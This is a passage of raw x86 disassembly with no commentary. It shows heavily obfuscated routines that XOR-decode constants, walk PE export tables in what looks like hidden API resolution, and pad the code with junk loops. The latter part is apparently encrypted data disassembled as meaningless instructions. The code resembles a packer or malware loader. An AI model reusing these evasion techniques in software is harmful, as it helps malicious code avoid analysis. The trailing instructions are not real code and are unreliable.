  40a252:	lock rol BYTE PTR [ecx-0x2d54dec2],cl
  40a259:	lea    eax,[eax+edi*1+0x64e5c4]
  40a260:	mov    edi,DWORD PTR [ebp+0xc]
  40a263:	xor    edi,ecx
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	(bad)  
  40abd7:	sbb    al,0xe8
  40abd9:	dec    edi
  40abda:	xor    ecx,DWORD PTR [esi]
  40abdc:	push   es
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	ins    DWORD PTR es:[edi],dx
  40abe4:	xchg   ebp,eax
  40abe5:	loope  0x40abba
  40abe7:	or     BYTE PTR [eax],ah
  40abe9:	daa    
  40abea:	mov    cx,0x1ccc
  40abee:	inc    eax
  40abef:	jno    0x40abe4
  40abf1:	daa    
  40abf2:	lods   al,BYTE PTR ds:[esi]
  40abf3:	dec    eax
  40abf4:	sbb    ch,ch
  40abf6:	das    
  40abf7:	ficomp DWORD PTR [esi]
  40abf9:	cdq    
  40abfa:	out    dx,al
  40abfb:	xchg   ebx,eax
  40abfc:	in     eax,0x67
  40abfe:	xchg   edx,eax
  40abff:	gs repz adc al,0xc4
  40ac03:	pushf  
  40ac04:	lods   eax,DWORD PTR ds:[esi]
  40ac05:	test   BYTE PTR [ebp-0x5f],ch
  40ac08:	or     BYTE PTR [ebx-0x7],bl
  40ac0b:	sub    eax,0xedb899c2
  40ac10:	rcr    bh,cl
  40ac12:	loop   0x40abef
  40ac14:	adc    eax,0x32b913af
  40ac19:	test   ecx,esi
  40ac1b:	aaa    
  40ac1c:	pop    es
  40ac1d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40ac1f:	ins    DWORD PTR es:[edi],dx
  40ac20:	cmc    
  40ac21:	dec    esi
  40ac22:	add    eax,0x2edc1be4
  40ac27:	bound  ebp,QWORD PTR ds:0xcfae2934
  40ac2d:	stos   DWORD PTR es:[edi],eax
  40ac2e:	dec    BYTE PTR [eax-0x31]
  40ac31:	adc    edx,DWORD PTR [esi+0x4d]
  40ac34:	dec    ebx
  40ac35:	fsub   DWORD PTR [ecx]
  40ac37:	mov    ds:0xa8c33463,eax
  40ac3c:	out    dx,eax
  40ac3d:	mov    eax,0xab986c75
  40ac42:	sub    dl,BYTE PTR [edi]
  40ac44:	dec    ebp
  40ac45:	adc    eax,0x8c66d4d8
  40ac4a:	das    
  40ac4b:	sub    eax,0x6f9a78db
  40ac50:	fld    QWORD PTR [edx]
  40ac52:	sbb    eax,0xc4393501
  40ac57:	add    eax,esp
  40ac59:	fsub   QWORD PTR [edx]
  40ac5b:	std    
  40ac5c:	or     al,cl
  40ac5e:	movaps XMMWORD PTR gs:[edx-0x70],xmm5
  40ac63:	jg     0x40ac7c
  40ac65:	pop    ecx
  40ac66:	stos   BYTE PTR es:[edi],al
  40ac67:	cmp    DWORD PTR [ebx-0x7d],ecx
  40ac6a:	ret    
  40ac6b:	cmp    BYTE PTR [esi+0x3131bb20],dh
  40ac71:	mov    edx,0x3d2e7745
  40ac76:	pop    esp
  40ac77:	dec    ebx
  40ac78:	cwde   
  40ac79:	loope  0x40aced
  40ac7b:	fld    QWORD PTR [ebx+0x2]
  40ac7e:	mov    esp,0x2619d6d1
  40ac83:	in     eax,dx
  40ac84:	mov    ch,0x8f
  40ac86:	iret   
  40ac87:	loope  0x40acd7
  40ac89:	jb     0x40ad01
  40ac8b:	pop    ecx
  40ac8c:	sbb    eax,0x6ee04a62
  40ac91:	pop    ss
  40ac92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac93:	es push es
  40ac95:	ret    
  40ac96:	imul   esp,DWORD PTR [edx+0x4f1395b5],0x37d247fc
  40aca0:	test   eax,ecx
  40aca2:	push   0xaf0d8d14
  40aca7:	out    dx,eax
  40aca8:	cmp    ebp,eax
  40acaa:	and    al,BYTE PTR [ebp-0x13712cd5]
  40acb0:	pop    ss
  40acb1:	adc    eax,0xbb7a5d36
  40acb6:	test   eax,0x3e45f797
  40acbb:	in     eax,0xcc
  40acbd:	push   eax
  40acbe:	sub    al,0xc7
  40acc0:	push   ss
  40acc1:	push   ebx
  40acc2:	mov    edx,DWORD PTR ds:0x186cc0a3
  40acc8:	aad    0x36
  40acca:	sti    
  40accb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40accc:	std    
  40accd:	imul   ebx,eax,0xa5d20a2a
  40acd3:	and    bl,BYTE PTR ds:[ebx-0x5b0b441d]
  40acda:	pop    eax
  40acdb:	lods   al,BYTE PTR ds:[esi]
  40acdc:	jb     0x40acf0
  40acde:	mov    cs,WORD PTR [ebx]
  40ace0:	xor    esi,edx
  40ace2:	jo     0x40ad0a
  40ace4:	fdivr  DWORD PTR [edx+edx*8]
  40ace7:	xor    DWORD PTR [edi],0xabc4b6ef
  40aced:	mov    al,ch
  40acef:	sbb    DWORD PTR ds:0x47f7fd21,esi
  40acf5:	retf   
  40acf6:	push   ebx
  40acf7:	ss enter 0xcf5,0xd0
  40acfc:	(bad)  
  40acfd:	loopne 0x40ad2c
